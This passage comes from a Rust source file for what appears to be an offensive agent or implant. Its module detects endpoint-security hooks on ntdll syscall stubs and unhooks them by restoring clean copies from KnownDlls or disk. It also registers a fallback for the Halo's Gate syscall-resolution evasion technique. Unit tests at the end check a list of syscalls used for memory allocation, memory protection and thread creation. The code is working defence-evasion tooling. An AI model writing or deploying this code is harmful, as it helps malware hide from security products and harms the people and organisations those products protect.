/// This is the primary integration point for periodic re-checks. Returns
/// `Ok(true)` if unhooking was performed, `Ok(false)` if no hooks were
/// detected, or `Err(...)` if unhooking was attempted but failed.
pub fn maybe_unhook() -> anyhow::Result<bool> {
    unsafe {
        if !are_syscall_stubs_hooked() {
            log::debug!("[ntdll_unhook] no hooks detected — skipping unhook");
            return Ok(false);
        }

        log::info!("[ntdll_unhook] hooks detected — initiating unhook");
        let result = unhook_ntdll()?;
        if result.error.is_empty() {
            log::info!(
                "[ntdll_unhook] unhook successful via {} ({} stubs re-resolved)",
                result.method,
                result.stubs_re_resolved,
            );
            Ok(true)
        } else {
            Err(anyhow::anyhow!("unhook failed: {}", result.error))
        }
    }
}

/// Get the timestamp (UNIX epoch seconds) of the last successful unhook.
/// Returns 0 if unhooking has never been performed.
pub fn last_unhook_time() -> u64 {
    LAST_UNHOOK_TIME.load(Ordering::Relaxed)
}

/// Get the timestamp (UNIX epoch seconds) of the last hook detection.
/// Returns 0 if hooks have never been detected.
pub fn last_hook_detection_time() -> u64 {
    LAST_HOOK_DETECTION.load(Ordering::Relaxed)
}

// ── Halo's Gate fallback callback ───────────────────────────────────────────

/// Callback for `nt_syscall::set_halo_gate_fallback`.
///
/// When Halo's Gate fails (all adjacent syscall stubs are hooked), the
/// `nt_syscall` crate invokes this function.  It performs a full ntdll
/// unhook (KnownDlls → disk fallback) and returns `true` on success.
///
/// Register during agent initialisation:
/// ```rust,ignore
/// nt_syscall::set_halo_gate_fallback(crate::ntdll_unhook::halo_gate_fallback);
/// ```
pub fn halo_gate_fallback() -> bool {
    log::info!("[ntdll_unhook] Halo's Gate fallback triggered — performing full unhook");
    match unhook_ntdll() {
        Ok(result) => {
            if result.error.is_empty() {
                log::info!(
                    "[ntdll_unhook] Halo's Gate fallback unhook succeeded via {}",
                    result.method,
                );
                // Invalidate the nt_syscall SSN cache and reset the clean ntdll
                // mapping so the retry reads fresh stubs from the unhooked ntdll.
                crate::syscalls::invalidate_syscall_cache();
                true
            } else {
                log::error!(
                    "[ntdll_unhook] Halo's Gate fallback unhook failed: {}",
                    result.error,
                );
                false
            }
        }
        Err(e) => {
            log::error!("[ntdll_unhook] Halo's Gate fallback unhook error: {e}");
            false
        }
    }
}

// ── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn critical_syscalls_list_not_empty() {
        assert!(!CRITICAL_SYSCALLS.is_empty());
        assert!(CRITICAL_SYSCALLS.contains(&"NtAllocateVirtualMemory"));
        assert!(CRITICAL_SYSCALLS.contains(&"NtProtectVirtualMemory"));
        assert!(CRITICAL_SYSCALLS.contains(&"NtClose"));
        assert!(CRITICAL_SYSCALLS.contains(&"NtCreateThreadEx"));
    }

    #[test]
    fn unhook_result_serde_roundtrip() {
        let r = UnhookResult {
            method: "known_dlls".to_string(),
            bytes_overwritten: 0x1000,
            hooks_detected: true,
            stubs_re_resolved: 20,
            error: String::new(),
        };
        let json = serde_json::to_string(&r).unwrap();
        let r2: UnhookResult = serde_json::from_str(&json).unwrap();
        assert_eq!(r.method, r2.method);
        assert_eq!(r.bytes_overwritten, r2.bytes_overwritten);
        assert_eq!(r.hooks_detected, r2.hooks_detected);
        assert_eq!(r.stubs_re_resolved, r2.stubs_re_resolved);
        assert_eq!(r.error, r2.error);
    }

    #[test]
    fn unhook_result_error_variant() {
        let r = UnhookResult {
            method: String::new(),
            bytes_overwritten: 0,
            hooks_detected: true,
            stubs_re_resolved: 0,
            error: "KnownDlls: foo; Disk: bar".to_string(),
        };
        let json = serde_json::to_string(&r).unwrap();
        assert!(json.contains("\"error\":"));
        assert!(json.contains("KnownDlls"));
    }

    #[test]
    fn chunk_size_reasonable() {
        assert_eq!(UNHOOK_CHUNK_SIZE, 0x1000);
        assert!(UNHOOK_CHUNK_DELAY_US > 0);
    }
}
